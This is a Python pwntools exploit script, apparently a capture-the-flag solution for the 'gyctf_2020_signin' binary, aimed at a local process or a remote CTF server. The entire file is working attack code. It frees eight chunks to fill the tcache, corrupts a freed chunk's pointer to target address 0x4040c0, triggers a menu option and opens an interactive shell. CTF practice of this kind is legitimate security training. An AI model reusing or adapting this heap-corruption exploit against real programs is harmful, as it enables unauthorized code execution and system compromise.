#!/usr/bin/env python
# coding=utf-8
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

local = 1
if local == 1:
    r=process('./gyctf_2020_signin')
    gdb.attach(r,'b * 0x4014D9')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r=remote('node4.buuoj.cn',26441)
    libc = ELF('./libc.so.6')


elf = ELF('./gyctf_2020_signin')

def add(num):
    r.recvuntil('oice?')
    r.sendline('1')
    r.recvuntil('idx?')
    r.sendline(str(num))

def dele(num):
    r.recvuntil('oice?')
    r.sendline('3')
    r.recvuntil('idx?')
    r.sendline(str(num))

def edit(num,content):
    r.recvuntil('oice?')
    r.sendline('2')
    r.recvuntil('idx?')
    r.sendline(str(num))
    sleep(1)
    r.send(content)

for i in range(8):
    add(i)
for i in range(8):
    dele(i)

add(8)
edit(7,p64(0x4040c0-0x10))

r.recvuntil('oice?')
r.sendline('6')


r.interactive()
